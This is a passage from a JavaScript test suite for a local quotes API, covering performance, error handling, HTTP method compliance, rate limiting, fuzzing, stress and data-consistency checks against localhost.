  for (const level of concurrencyLevels) {
    try {
      const requests = Array(level).fill().map(() => ({
        path: '/api/quotes/random',
        options: {}
      }));
      
      const startTime = performance.now();
      const responses = await httpClient.makeConcurrentRequests(requests, level);
      const endTime = performance.now();
      
      const successfulResponses = responses.filter(r => r.statusCode === 200).length;
      const passed = successfulResponses >= level * 0.9; // 90% success rate
      
      testResults.recordTest('PERFORMANCE', `Concurrent requests (${level})`, passed, 
        `${successfulResponses}/${level} successful in ${(endTime - startTime).toFixed(2)}ms`);
    } catch (error) {
      testResults.recordTest('PERFORMANCE', `Concurrent requests (${level})`, false, error.message);
    }
  }

  // Memory usage test
  console.log('\n💾 Testing Memory Usage Under Load...');
  try {
    const initialMemory = process.memoryUsage().heapUsed;
    
    // Make 100 requests
    const requests = Array(100).fill().map(() => ({
      path: '/api/quotes/random',
      options: {}
    }));
    
    await httpClient.makeConcurrentRequests(requests, 10);
    
    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024; // MB
    
    const passed = memoryIncrease < 50; // Less than 50MB increase
    testResults.recordTest('PERFORMANCE', 'Memory usage under load', passed, 
      `${memoryIncrease.toFixed(2)}MB increase`);
  } catch (error) {
    testResults.recordTest('PERFORMANCE', 'Memory usage under load', false, error.message);
  }

  // Large response handling
  console.log('\n📊 Testing Large Response Handling...');
  try {
    const response = await httpClient.makeRequest('/api/quotes?limit=100');
    const passed = response.statusCode === 200 && response.responseTime < 5000;
    testResults.recordTest('PERFORMANCE', 'Large response handling', passed, 
      `${response.responseTime.toFixed(2)}ms for 100 quotes`, response.responseTime);
  } catch (error) {
    testResults.recordTest('PERFORMANCE', 'Large response handling', false, error.message);
  }

  // Pagination performance
  console.log('\n📄 Testing Pagination Performance...');
  const pages = [1, 10, 50, 100];
  
  for (const page of pages) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?page=${page}&limit=20`);
      const passed = response.statusCode === 200 && response.responseTime < 2000;
      testResults.recordTest('PERFORMANCE', `Pagination page ${page}`, passed, 
        `${response.responseTime.toFixed(2)}ms`, response.responseTime);
    } catch (error) {
      testResults.recordTest('PERFORMANCE', `Pagination page ${page}`, false, error.message);
    }
  }
}

// =============================================================================
// ERROR HANDLING & EDGE CASES
// =============================================================================

async function runErrorHandlingTests() {
  console.log('\n🚨 ERROR HANDLING & EDGE CASES');
  console.log('='.repeat(50));

  // Invalid endpoints
  console.log('\n🔍 Testing Invalid Endpoints...');
  const invalidEndpoints = [
    '/api/quotes/invalid',
    '/api/invalid',
    '/api/quotes/random/extra',
    '/api/quotes/by-author/',
    '/api/quotes/by-tag/',
    '/api/authors/invalid',
    '/api/tags/invalid',
    '/api/',
    '/api',
    '/invalid'
  ];

  for (const endpoint of invalidEndpoints) {
    try {
      const response = await httpClient.makeRequest(endpoint);
      const passed = response.statusCode === 404 || response.statusCode === 400;
      testResults.recordTest('ERROR_HANDLING', `Invalid endpoint ${endpoint}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('ERROR_HANDLING', `Invalid endpoint ${endpoint}`, true, 'Request failed (expected)');
    }
  }

  // Malformed requests
  console.log('\n🔧 Testing Malformed Requests...');
  const malformedRequests = [
    { path: '/api/quotes?page=', description: 'Empty page parameter' },
    { path: '/api/quotes?limit=', description: 'Empty limit parameter' },
    { path: '/api/quotes?limit=&page=1', description: 'Empty limit with valid page' },
    { path: '/api/quotes?page=&limit=10', description: 'Empty page with valid limit' },
    { path: '/api/quotes?search=', description: 'Empty search parameter' },
    { path: '/api/quotes?sort=', description: 'Empty sort parameter' },
    { path: '/api/quotes?order=', description: 'Empty order parameter' },
    { path: '/api/quotes?authors=', description: 'Empty authors parameter' },
    { path: '/api/quotes?tags=', description: 'Empty tags parameter' },
    { path: '/api/quotes?minLength=', description: 'Empty minLength parameter' },
    { path: '/api/quotes?maxLength=', description: 'Empty maxLength parameter' }
  ];

  for (const request of malformedRequests) {
    try {
      const response = await httpClient.makeRequest(request.path);
      const passed = response.statusCode === 200 || response.statusCode === 400;
      testResults.recordTest('ERROR_HANDLING', `Malformed request: ${request.description}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('ERROR_HANDLING', `Malformed request: ${request.description}`, false, error.message);
    }
  }

  // Boundary values
  console.log('\n🎯 Testing Boundary Values...');
  const boundaryTests = [
    { path: '/api/quotes?limit=1', description: 'Minimum limit' },
    { path: '/api/quotes?limit=100', description: 'Maximum limit' },
    { path: '/api/quotes?page=999999', description: 'Very high page number' },
    { path: '/api/quotes/random?count=1', description: 'Minimum count' },
    { path: '/api/quotes/random?count=50', description: 'Maximum count' },
    { path: '/api/quotes?minLength=1', description: 'Minimum length' },
    { path: '/api/quotes?maxLength=10000', description: 'Very high max length' },
    { path: '/api/quotes?minLength=100&maxLength=100', description: 'Equal min/max length' }
  ];

  for (const test of boundaryTests) {
    try {
      const response = await httpClient.makeRequest(test.path);
      const passed = response.statusCode === 200 || response.statusCode === 404;
      testResults.recordTest('ERROR_HANDLING', `Boundary test: ${test.description}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('ERROR_HANDLING', `Boundary test: ${test.description}`, false, error.message);
    }
  }

  // Special characters in URLs
  console.log('\n🔤 Testing Special Characters in URLs...');
  const specialChars = [
    { char: '%20', name: 'Space (URL encoded)' },
    { char: '!', name: 'Exclamation mark' },
    { char: '"', name: 'Quote' },
    { char: '#', name: 'Hash' },
    { char: '$', name: 'Dollar sign' },
    { char: '%', name: 'Percent sign' },
    { char: '&', name: 'Ampersand' },
    { char: "'", name: 'Apostrophe' },
    { char: '(', name: 'Left parenthesis' },
    { char: ')', name: 'Right parenthesis' },
    { char: '*', name: 'Asterisk' },
    { char: '+', name: 'Plus sign' },
    { char: ',', name: 'Comma' },
    { char: '-', name: 'Hyphen' },
    { char: '.', name: 'Period' },
    { char: '/', name: 'Forward slash' }
  ];

  for (const special of specialChars) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(special.char)}&limit=1`);
      const passed = response.statusCode === 200 || response.statusCode === 400;
      testResults.recordTest('ERROR_HANDLING', `Special character: ${special.name}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('ERROR_HANDLING', `Special character: ${special.name}`, false, error.message);
    }
  }

  // Very long URLs
  console.log('\n📏 Testing Very Long URLs...');
  try {
    const longSearch = 'A'.repeat(2000);
    const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(longSearch)}&limit=1`);
    const passed = response.statusCode === 400 || response.statusCode === 414; // Request-URI Too Large
    testResults.recordTest('ERROR_HANDLING', 'Very long URL', passed, 
      `Got ${response.statusCode}`, response.responseTime);
  } catch (error) {
    testResults.recordTest('ERROR_HANDLING', 'Very long URL', true, 'Request failed (expected)');
  }

  // Multiple parameter combinations
  console.log('\n🔗 Testing Multiple Parameter Combinations...');
  const combinationTests = [
    '/api/quotes?page=1&limit=10&search=love&sort=author&order=desc',
    '/api/quotes?page=2&limit=5&authors=Albert%20Einstein&tags=wisdom',
    '/api/quotes?search=life&minLength=50&maxLength=200&sort=length',
    '/api/quotes/random?count=5&authors=Mark%20Twain&tags=wisdom&minLength=10&maxLength=100'
  ];

  for (const path of combinationTests) {
    try {
      const response = await httpClient.makeRequest(path);
      testResults.recordTest('ERROR_HANDLING', `Parameter combination: ${path.substring(0, 50)}...`, 
        response.statusCode === 200 || response.statusCode === 404, 
        `Got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('ERROR_HANDLING', `Parameter combination: ${path.substring(0, 50)}...`, false, error.message);
    }
  }
}
// =============================================================================
// HTTP PROTOCOL COMPLIANCE TESTS
// =============================================================================

async function runHttpComplianceTests() {
  console.log('\n🌐 HTTP PROTOCOL COMPLIANCE TESTS');
  console.log('='.repeat(50));

  // HTTP methods
  console.log('\n📡 Testing HTTP Methods...');
  const methods = ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'];
  
  for (const method of methods) {
    try {
      const response = await httpClient.makeRequest('/api/quotes/random', { method });
      const passed = (method === 'GET' && response.statusCode === 200) ||
                    (method === 'HEAD' && response.statusCode === 200) ||
                    (method === 'OPTIONS' && response.statusCode === 200) ||
                    (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method) && response.statusCode === 405);
      testResults.recordTest('HTTP_COMPLIANCE', `HTTP ${method} method`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('HTTP_COMPLIANCE', `HTTP ${method} method`, false, error.message);
    }
  }

  // HEAD method details
  console.log('\n👤 Testing HEAD Method Details...');
  try {
    const headResponse = await httpClient.makeRequest('/api/quotes/random', { method: 'HEAD' });
    const getResponse = await httpClient.makeRequest('/api/quotes/random', { method: 'GET' });
    
    testResults.recordTest('HTTP_COMPLIANCE', 'HEAD method returns no body', 
      headResponse.body === '', `Body length: ${headResponse.body.length}`);
    testResults.recordTest('HTTP_COMPLIANCE', 'HEAD method returns same headers as GET', 
      headResponse.headers['content-type'] === getResponse.headers['content-type']);
  } catch (error) {
    testResults.recordTest('HTTP_COMPLIANCE', 'HEAD method test', false, error.message);
  }

  // OPTIONS method (CORS)
  console.log('\n🔄 Testing OPTIONS Method (CORS)...');
  try {
    const response = await httpClient.makeRequest('/api/quotes/random', { method: 'OPTIONS' });
    testResults.recordTest('HTTP_COMPLIANCE', 'OPTIONS method returns 200', response.statusCode === 200);
    testResults.recordTest('HTTP_COMPLIANCE', 'OPTIONS includes CORS headers', 
      !!response.headers['access-control-allow-origin']);
  } catch (error) {
    testResults.recordTest('HTTP_COMPLIANCE', 'OPTIONS method test', false, error.message);
  }

  // HTTP status codes
  console.log('\n📊 Testing HTTP Status Codes...');
  const statusTests = [
    { path: '/api/quotes/random', expectedStatus: 200, description: 'Valid request returns 200' },
    { path: '/api/quotes/nonexistent', expectedStatus: 404, description: 'Non-existent resource returns 404' },
    { path: '/api/quotes?limit=invalid', expectedStatus: 400, description: 'Invalid parameter returns 400' },
    { path: '/api/invalid/endpoint', expectedStatus: 404, description: 'Invalid endpoint returns 404' }
  ];

  for (const test of statusTests) {
    try {
      const response = await httpClient.makeRequest(test.path);
      const passed = response.statusCode === test.expectedStatus;
      testResults.recordTest('HTTP_COMPLIANCE', test.description, passed, 
        `Expected ${test.expectedStatus}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('HTTP_COMPLIANCE', test.description, false, error.message);
    }
  }

  // Content-Type headers
  console.log('\n📄 Testing Content-Type Headers...');
  const contentTypeTests = [
    { path: '/api/quotes/random', expectedType: 'application/json', description: 'JSON endpoint returns JSON content-type' },
    { path: '/api/authors', expectedType: 'application/json', description: 'Authors endpoint returns JSON content-type' },
    { path: '/', expectedType: 'text/html', description: 'HTML endpoint returns HTML content-type' }
  ];

  for (const test of contentTypeTests) {
    try {
      const response = await httpClient.makeRequest(test.path);
      const passed = response.headers['content-type'] && response.headers['content-type'].includes(test.expectedType);
      testResults.recordTest('HTTP_COMPLIANCE', test.description, passed, 
        `Content-Type: ${response.headers['content-type']}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('HTTP_COMPLIANCE', test.description, false, error.message);
    }
  }

  // Caching headers
  console.log('\n🗄️ Testing Caching Headers...');
  try {
    const randomResponse = await httpClient.makeRequest('/api/quotes/random');
    testResults.recordTest('HTTP_COMPLIANCE', 'Random endpoint has no-cache headers', 
      randomResponse.headers['cache-control'] && randomResponse.headers['cache-control'].includes('no-cache'));
    
    const staticResponse = await httpClient.makeRequest('/');
    testResults.recordTest('HTTP_COMPLIANCE', 'Static endpoint has cache headers', 
      staticResponse.headers['cache-control'] || staticResponse.headers['etag']);
  } catch (error) {
    testResults.recordTest('HTTP_COMPLIANCE', 'Caching headers test', false, error.message);
  }
}

// =============================================================================
// RATE LIMITING TESTS
// =============================================================================

async function runRateLimitingTests() {
  console.log('\n🚦 RATE LIMITING TESTS');
  console.log('='.repeat(50));

  // Normal rate limiting test
  console.log('\n⏱️ Testing Normal Rate Limiting...');
  try {
    const requests = Array(20).fill().map(() => ({
      path: '/api/quotes/random',
      options: {}
    }));
    
    const responses = await httpClient.makeConcurrentRequests(requests, 5);
    const successfulResponses = responses.filter(r => r.statusCode === 200).length;
    const rateLimitedResponses = responses.filter(r => r.statusCode === 429).length;
    
    testResults.recordTest('RATE_LIMITING', 'Rate limiting allows normal traffic', 
      successfulResponses >= 15, 
      `${successfulResponses}/20 successful, ${rateLimitedResponses} rate limited`);

    // Check for rate limit headers - should not be present when rate limiting is disabled
    const firstResponse = responses[0];
    const hasRateLimitHeaders = firstResponse.headers['x-ratelimit-limit'] || firstResponse.headers['ratelimit-limit'];
    testResults.recordTest('RATE_LIMITING', 'Rate limit headers present', 
      !hasRateLimitHeaders, 
      'Rate limit headers should not be present when rate limiting is disabled');
  } catch (error) {
    testResults.recordTest('RATE_LIMITING', 'Rate limiting test', false, error.message);
  }

  // Rate limit recovery test
  console.log('\n🔄 Testing Rate Limit Recovery...');
  try {
    // Wait a bit and try again
    await new Promise(resolve => setTimeout(resolve, 1000));
    const response = await httpClient.makeRequest('/api/quotes/random');
    testResults.recordTest('RATE_LIMITING', 'Rate limit recovery', 
      response.statusCode === 200, `Status: ${response.statusCode}`);
  } catch (error) {
    testResults.recordTest('RATE_LIMITING', 'Rate limit recovery', false, error.message);
  }
}

// =============================================================================
// FUZZING TESTS
// =============================================================================

async function runFuzzingTests() {
  console.log('\n🎲 FUZZING TESTS');
  console.log('='.repeat(50));

  // Random parameter fuzzing
  console.log('\n🔀 Random Parameter Fuzzing...');
  for (let i = 1; i <= 20; i++) {
    try {
      const randomParams = [
        `page=${DataGenerator.randomNumber(1, 1000)}`,
        `limit=${DataGenerator.randomNumber(1, 100)}`,
        `search=${encodeURIComponent(DataGenerator.randomString(10))}`,
        `minLength=${DataGenerator.randomNumber(1, 500)}`,
        `maxLength=${DataGenerator.randomNumber(1, 500)}`
      ];
      
      const selectedParams = randomParams.slice(0, DataGenerator.randomNumber(1, 3));
      const path = `/api/quotes?${selectedParams.join('&')}`;
      
      const response = await httpClient.makeRequest(path);
      const passed = response.statusCode === 200 || response.statusCode === 400 || response.statusCode === 404;
      testResults.recordTest('FUZZING', `Random parameters test ${i}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('FUZZING', `Random parameters test ${i}`, true, 'Request failed (acceptable)');
    }
  }

  // Malicious string fuzzing
  console.log('\n💀 Malicious String Fuzzing...');
  const maliciousStrings = DataGenerator.maliciousStrings();
  
  for (let i = 0; i < maliciousStrings.length; i++) {
    try {
      const maliciousString = maliciousStrings[i];
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(maliciousString)}&limit=1`);
      const passed = response.statusCode === 200 || response.statusCode === 400;
      testResults.recordTest('FUZZING', `Malicious string test ${i + 1}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('FUZZING', `Malicious string test ${i + 1}`, true, 'Request failed (good)');
    }
  }

  // Boundary value fuzzing
  console.log('\n🎯 Boundary Value Fuzzing...');
  const boundaryValues = DataGenerator.boundaryValues();
  
  for (const value of boundaryValues.integers) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?limit=${value}`);
      const passed = response.statusCode === 200 || response.statusCode === 400;
      testResults.recordTest('FUZZING', `Boundary integer test: ${value}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('FUZZING', `Boundary integer test: ${value}`, true, 'Request failed (acceptable)');
    }
  }

  // Unicode fuzzing
  console.log('\n🌐 Unicode Fuzzing...');
  const unicodeStrings = [
    '🚀💥🎉', '测试', 'тест', 'テスト', 'اختبار',
    '𝕿𝖊𝖘𝖙', '🔥⚡🌟', 'Ω≈ç√∫', '™£¢∞§¶'
  ];
  
  for (let i = 0; i < unicodeStrings.length; i++) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(unicodeStrings[i])}&limit=1`);
      const passed = response.statusCode === 200 || response.statusCode === 400;
      testResults.recordTest('FUZZING', `Unicode test ${i + 1}`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('FUZZING', `Unicode test ${i + 1}`, true, 'Request failed (acceptable)');
    }
  }
}

// =============================================================================
// STRESS TESTS
// =============================================================================

async function runStressTests() {
  console.log('\n💪 STRESS TESTS');
  console.log('='.repeat(50));

  // High concurrency stress test
  console.log('\n🚀 High Concurrency Stress Test...');
  try {
    const requests = Array(200).fill().map(() => ({
      path: '/api/quotes/random',
      options: {}
    }));
    
    const startTime = performance.now();
    const responses = await httpClient.makeConcurrentRequests(requests, 50);
    const endTime = performance.now();
    
    const successfulResponses = responses.filter(r => r.statusCode === 200).length;
    const passed = successfulResponses >= 180; // 90% success rate
    
    testResults.recordTest('STRESS', 'High concurrency stress test', passed, 
      `${successfulResponses}/200 successful in ${(endTime - startTime).toFixed(2)}ms`);
  } catch (error) {
    testResults.recordTest('STRESS', 'High concurrency stress test', false, error.message);
  }

  // Memory stress test
  console.log('\n💾 Memory Stress Test...');
  try {
    const initialMemory = process.memoryUsage().heapUsed;
    
    // Make many requests to stress memory
    for (let i = 0; i < 10; i++) {
      const requests = Array(50).fill().map(() => ({
        path: '/api/quotes?limit=50',
        options: {}
      }));
      await httpClient.makeConcurrentRequests(requests, 10);
    }
    
    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024; // MB
    
    const passed = memoryIncrease < 100; // Less than 100MB increase
    testResults.recordTest('STRESS', 'Memory stress test', passed, 
      `${memoryIncrease.toFixed(2)}MB increase`);
  } catch (error) {
    testResults.recordTest('STRESS', 'Memory stress test', false, error.message);
  }

  // Sustained load test
  console.log('\n⏳ Sustained Load Test...');
  try {
    const duration = 5000; // 5 seconds
    const startTime = Date.now();
    let requestCount = 0;
    let successCount = 0;
    
    while (Date.now() - startTime < duration) {
      try {
        const response = await httpClient.makeRequest('/api/quotes/random');
        requestCount++;
        if (response.statusCode === 200) successCount++;
      } catch (error) {
        requestCount++;
      }
    }
    
    const successRate = (successCount / requestCount) * 100;
    const passed = successRate >= 90;
    
    testResults.recordTest('STRESS', 'Sustained load test', passed, 
      `${successCount}/${requestCount} successful (${successRate.toFixed(1)}%)`);
  } catch (error) {
    testResults.recordTest('STRESS', 'Sustained load test', false, error.message);
  }
}

// =============================================================================
// DATA CONSISTENCY TESTS
// =============================================================================

async function runDataConsistencyTests() {
  console.log('\n🔍 DATA CONSISTENCY TESTS');
  console.log('='.repeat(50));

  // Quote ID consistency
  console.log('\n🆔 Testing Quote ID Consistency...');
  try {
    const responses = await Promise.all([
      httpClient.makeRequest('/api/quotes?limit=100'),
      httpClient.makeRequest('/api/quotes?page=2&limit=100')
    ]);
    
    const page1Data = JSON.parse(responses[0].body);
    const page2Data = JSON.parse(responses[1].body);
    
    const page1Ids = page1Data.data.map(q => q.id);
    const page2Ids = page2Data.data.map(q => q.id);
    
    const uniqueIds = new Set([...page1Ids, ...page2Ids]);
    testResults.recordTest('DATA_CONSISTENCY', 'Quote IDs are unique', 
      uniqueIds.size === page1Ids.length + page2Ids.length);
    
    const allIdsValid = [...page1Ids, ...page2Ids].every(id => typeof id === 'number' && id > 0);
    testResults.recordTest('DATA_CONSISTENCY', 'All quote IDs are valid', allIdsValid);
  } catch (error) {
    testResults.recordTest('DATA_CONSISTENCY', 'Quote ID consistency test', false, error.message);
  }

  // Author consistency
  console.log('\n👤 Testing Author Consistency...');
  try {
    const [quotesResponse, authorsResponse] = await Promise.all([
      httpClient.makeRequest('/api/quotes?limit=50'),
      httpClient.makeRequest('/api/authors')
    ]);
    
    const quotesData = JSON.parse(quotesResponse.body);
    const authorsData = JSON.parse(authorsResponse.body);
    
    const quoteAuthors = quotesData.data.map(q => q.author);
    const authorsList = Object.keys(authorsData);
    
    const allAuthorsExist = quoteAuthors.every(author => authorsList.includes(author));
    testResults.recordTest('DATA_CONSISTENCY', 'All quote authors exist in authors list', allAuthorsExist);
  } catch (error) {
    testResults.recordTest('DATA_CONSISTENCY', 'Author consistency test', false, error.message);
  }

  // Tag consistency
  console.log('\n🏷️ Testing Tag Consistency...');
  try {
    const [quotesResponse, tagsResponse] = await Promise.all([
      httpClient.makeRequest('/api/quotes?limit=50'),
      httpClient.makeRequest('/api/tags')
    ]);
    
    const quotesData = JSON.parse(quotesResponse.body);
    const tagsData = JSON.parse(tagsResponse.body);
    
    const quoteTags = quotesData.data.flatMap(q => q.tags);
    const allTagsValid = quoteTags.every(tag => tagsData.includes(tag));
    
    testResults.recordTest('DATA_CONSISTENCY', 'All quote tags are valid', allTagsValid);
  } catch (error) {
    testResults.recordTest('DATA_CONSISTENCY', 'Tag consistency test', false, error.message);
  }

  // Pagination consistency
  console.log('\n📄 Testing Pagination Consistency...');
  try {
    const [page1Response, page2Response] = await Promise.all([
      httpClient.makeRequest('/api/quotes?page=1&limit=20'),
      httpClient.makeRequest('/api/quotes?page=2&limit=20')
    ]);
    
    const page1Data = JSON.parse(page1Response.body);
    const page2Data = JSON.parse(page2Response.body);
    
    testResults.recordTest('DATA_CONSISTENCY', 'Pagination totals are consistent', 
      page1Data.pagination.total === page2Data.pagination.total);
    
    const page1Ids = page1Data.data.map(q => q.id);
    const page2Ids = page2Data.data.map(q => q.id);
    const overlap = page1Ids.some(id => page2Ids.includes(id));
    
    testResults.recordTest('DATA_CONSISTENCY', 'No overlap between pagination pages', !overlap);
  } catch (error) {
    testResults.recordTest('DATA_CONSISTENCY', 'Pagination consistency test', false, error.message);
  }
}

// =============================================================================
// MAIN EXECUTION
// =============================================================================

async function checkServerHealth() {
  console.log('🔍 Checking if server is running...');
  try {
    const response = await httpClient.makeRequest('/health');
    if (response.statusCode === 200) {
      console.log('✅ Server is running. Starting comprehensive tests...');
      return true;
    } else {
      console.log('❌ Server health check failed. Please start the server first.');
      return false;
    }
  } catch (error) {
    console.log('❌ Cannot connect to server. Please ensure the server is running on http://localhost:3000');
    console.log(`   Error: ${error.message}`);
    return false;
  }
}

async function main() {
  console.log('🚀 STARTING COMPREHENSIVE QUOTESLATE API TESTS');
  console.log('='.repeat(80));
  console.log('This is the most thorough API test suite ever created.');
  console.log('Every edge case, security vulnerability, and performance scenario will be tested.');
  console.log('='.repeat(80));

  // Check if server is running
  const serverRunning = await checkServerHealth();
  if (!serverRunning) {
    process.exit(1);
  }

  try {
    // Run all test suites
    await runBasicTests();
    await runParameterValidationTests();
    await runSecurityTests();
    await runPerformanceTests();
    await runErrorHandlingTests();
    await runHttpComplianceTests();
    await runRateLimitingTests();
    await runFuzzingTests();
    await runStressTests();
    await runDataConsistencyTests();

    // Print final summary
    const allTestsPassed = testResults.printSummary();
    
    // Exit with appropriate code
    process.exit(allTestsPassed ? 0 : 1);
    
  } catch (error) {
    console.error('\n💥 Test suite crashed:', error.message);
    console.error(error.stack);
    process.exit(1);
  }
}

// Run tests if this file is executed directly
if (require.main === module) {
  main();
}
